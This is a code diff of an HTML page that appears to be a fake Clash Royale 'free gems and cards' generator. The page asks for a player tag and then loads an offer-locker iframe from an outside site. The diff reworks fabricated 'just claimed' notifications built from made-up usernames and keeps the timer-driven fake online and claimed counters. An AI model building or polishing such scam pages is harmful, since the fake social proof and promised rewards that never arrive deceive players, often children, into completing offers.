@@ -31,7 +31,7 @@
         #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
         #tutorialGif { width: 100%; height: 100%; object-fit: cover; }
 
-        /* LIVE BAR */
+        /* LIVE NOTIFICATION (TOP) */
         .live-bar { background: rgba(0,0,0,0.7); padding: 8px 0; font-size: 13px; height: 20px; border-bottom: 2px solid var(--cr-gold); overflow: hidden; }
         #liveText { transition: transform 0.5s ease-in-out, opacity 0.5s; display: inline-block; width: 100%; }
 
@@ -84,16 +84,18 @@
         .modal-box {
             background: var(--cr-white); width: 85%; max-width: 400px;
             border: 5px solid var(--cr-gold); border-radius: 30px;
-            padding: 20px 15px; color: #004a8d; text-align: center;
+            padding: 20px 15px; color: #004a8d; text-align: center; position: relative;
         }
 
-        /* PHOTO D REWARD F MODAL */
-        .selected-reward-preview {
-            width: 100px; height: 100px; object-fit: contain; margin: 10px auto;
-            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
-            animation: pulse 1.5s infinite;
+        /* BACK BUTTON */
+        .btn-back {
+            position: absolute; top: 15px; left: 15px; background: none; border: none;
+            font-size: 24px; color: #0056b3; cursor: pointer; transition: transform 0.2s;
         }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .btn-back:hover { transform: scale(1.2); }
+
+        .selected-reward-preview { width: 100px; height: 100px; object-fit: contain; margin: 10px auto; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
         .modal-input {
             background: #f0f0f0; border: 3px solid var(--cr-gold); border-radius: 18px;
@@ -106,7 +108,9 @@
             color: white; font-family: 'Lilita One'; font-size: 32px; padding: 12px 0; width: 100%; cursor: pointer;
         }
 
+        /* FOOTER L-K7AL */
         footer { margin-top: 60px; background: #000; padding: 50px 20px; text-align: left; color: #ffffff; font-family: sans-serif; }
+        .footer-top { display: flex; justify-content: space-between; max-width: 500px; margin: 0 auto 30px auto; flex-wrap: wrap; gap: 20px; }
         .footer-bottom { max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between; border-top: 1px solid #333; padding-top: 30px; }
         .sc-logo-footer { width: 120px; margin-top: 20px; }
     </style>
@@ -139,11 +143,13 @@
         <div class="grid" id="mainGrid"></div>
     </div>
 
-    <!-- MODAL DYAL SMYA (B PHOTO) -->
+    <!-- MODAL SMYA (PAGE 2) -->
     <div class="modal-overlay" id="modalTag">
         <div class="modal-box">
-            <h3 style="margin:0; color: #0056b3;">YOU SELECTED:</h3>
-            <!-- Hna fin ghadi t-affichager l-photo -->
+            <!-- BOUTON BACK -->
+            <button class="btn-back" onclick="closeModal('modalTag')"><i class="fas fa-arrow-left"></i></button>
+            
+            <h3 style="margin:0; color: #0056b3; margin-top: 20px;">YOU SELECTED:</h3>
             <img id="rewardDisplay" src="" class="selected-reward-preview">
             <h2 id="rewardNameDisplay" style="margin:5px 0; font-size: 18px;">REWARD</h2>
             
@@ -152,9 +158,11 @@
         </div>
     </div>
 
+    <!-- LOCKER -->
     <div class="modal-overlay" id="modalLocker">
         <div class="modal-box" style="max-width: 450px; padding: 10px;">
-            <h2 style="margin:10px 0;">FINAL STEP</h2>
+            <button class="btn-back" onclick="closeModal('modalLocker')"><i class="fas fa-arrow-left"></i></button>
+            <h2 style="margin:25px 0 10px 0;">FINAL STEP</h2>
             <div style="background:#000; border-radius:20px; height:450px; overflow:hidden;">
                 <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
             </div>
@@ -162,6 +170,15 @@
     </div>
 
     <footer>
+        <div class="footer-top">
+            <div>
+                <h4>Download our games</h4>
+                <div style="display:flex; gap:10px;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" height="35">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" height="35">
+                </div>
+            </div>
+        </div>
         <div class="footer-bottom">
             <div style="display:flex; flex-direction:column; gap:10px;">
                 <a href="#" style="color:white; text-decoration:none; font-size:14px;">Privacy Policy</a>
@@ -175,36 +192,35 @@
 
     <script>
         const rewardsData = [
-            {n: "10,000 GEMS", q: "X24", img: "gems5000.PNG"},
-            {n: "LEGENDARY CHEST", q: "X1", img: "chest5stars.PNG"},
-            {n: "EVO KNIGHT", q: "X1", img: "evoknight.PNG"},
-            {n: "MAGIC ARCHER", q: "X1", img: "archer.PNG"},
-            {n: "BALLOON", q: "X1", img: "Balloon.PNG"},
-            {n: "KNIGHT", q: "X1", img: "Knight.PNG"},
-            {n: "PRINCE", q: "X1", img: "prince.PNG"},
-            {n: "WIZARD", q: "X1", img: "wizard.PNG"},
-            {n: "MUSKETEER", q: "X1", img: "musketeer.PNG"},
-            {n: "GIANT", q: "X1", img: "giant.PNG"},
-            {n: "GOLEM", q: "X1", img: "golem.PNG"},
-            {n: "MINI P.E.K.K.A", q: "X1", img: "minipekka.PNG"},
-            {n: "BARBARIAN BARREL", q: "X1", img: "barrel.PNG"},
-            {n: "MEGA MINION", q: "X1", img: "Minion.PNG"},
-            {n: "GOBLINS", q: "X1", img: "goblins.PNG"}
+            {n: "10,000 GEMS", img: "gems5000.PNG"},
+            {n: "LEGENDARY CHEST", img: "chest5stars.PNG"},
+            {n: "EVO KNIGHT", img: "evoknight.PNG"},
+            {n: "MAGIC ARCHER", img: "archer.PNG"},
+            {n: "BALLOON", img: "Balloon.PNG"},
+            {n: "KNIGHT", img: "Knight.PNG"},
+            {n: "PRINCE", img: "prince.PNG"},
+            {n: "WIZARD", img: "wizard.PNG"},
+            {n: "MUSKETEER", img: "musketeer.PNG"},
+            {n: "GIANT", img: "giant.PNG"},
+            {n: "GOLEM", img: "golem.PNG"},
+            {n: "MINI P.E.K.K.A", img: "minipekka.PNG"},
+            {n: "BARBARIAN BARREL", img: "barrel.PNG"},
+            {n: "MEGA MINION", img: "Minion.PNG"},
+            {n: "GOBLINS", img: "goblins.PNG"}
         ];
 
-        const usernames = ["Mohamed_JKK", "Daniel_Ulta", "Zeneex_99", "Alpha_CR", "Shadow_X", "EliteGamer", "KingRoyale", "Hamza_92", "Omar_CR", "Anass_GG"];
+        const usernames = ["Mohamed_JKK", "Daniel_Ulta", "Zeneex_99", "Alpha_CR", "Shadow_X", "EliteGamer", "KingRoyale", "Hamza_92", "Omar_CR", "Anass_GG", "Younes_Pro", "Simo_Hustle"];
 
         const grid = document.getElementById('mainGrid');
         rewardsData.forEach((r, index) => {
             grid.innerHTML += `<div class="card">
                 <div class="item-name">${r.n}</div>
-                <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/80'"></div>
-                <div class="price-line">${r.q} FREE</div>
+                <div class="img-box"><img src="./${r.img}" class="item-img"></div>
+                <div class="price-line">FREE</div>
                 <button class="btn-claim" onclick="openTagModal(${index})">CLAIM</button>
             </div>`;
         });
 
-        // FUNCTION BACH T-AFFICHAGER L-PHOTO D REWARD
         function openTagModal(index) {
             const selected = rewardsData[index];
             document.getElementById('rewardDisplay').src = `./${selected.img}`;
@@ -212,7 +228,24 @@
             document.getElementById('modalTag').style.display = 'flex';
         }
 
-        // STATS DYNAMIC
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        // LIVE NOTIF USING ONLY PAGE REWARDS
+        function updateLiveNotification() {
+            const liveText = document.getElementById('liveText');
+            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+            const randomReward = rewardsData[Math.floor(Math.random() * rewardsData.length)];
+            
+            liveText.style.opacity = '0';
+            setTimeout(() => {
+                liveText.innerHTML = `🔥 <b>${randomUser}</b> just claimed <span style="color:var(--cr-gold)">${randomReward.n}</span>!`;
+                liveText.style.opacity = '1';
+            }, 500);
+        }
+        setInterval(updateLiveNotification, 4000);
+        updateLiveNotification();
+
+        // DYNAMIC STATS
         let onlineCount = 1088;
         let claimedCount = 3122;
         setInterval(() => {
@@ -221,20 +254,6 @@
             document.getElementById('live_online').innerText = onlineCount.toLocaleString();
             document.getElementById('live_claimed').innerText = claimedCount.toLocaleString();
         }, 2500);
-
-        // LIVE NOTIF
-        function updateLiveNotification() {
-            const liveText = document.getElementById('liveText');
-            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
-            const randomGems = [2000, 5000, 10000, "Pass Royale"][Math.floor(Math.random() * 4)];
-            liveText.style.opacity = '0';
-            setTimeout(() => {
-                liveText.innerHTML = `🔥 <b>${randomUser}</b> just claimed <span style="color:var(--cr-gold)">${randomGems}</span>!`;
-                liveText.style.opacity = '1';
-            }, 500);
-        }
-        setInterval(updateLiveNotification, 4000);
-        updateLiveNotification();
 
         function goToLocker() {
             if(document.getElementById('playerTag').value.length > 2) {
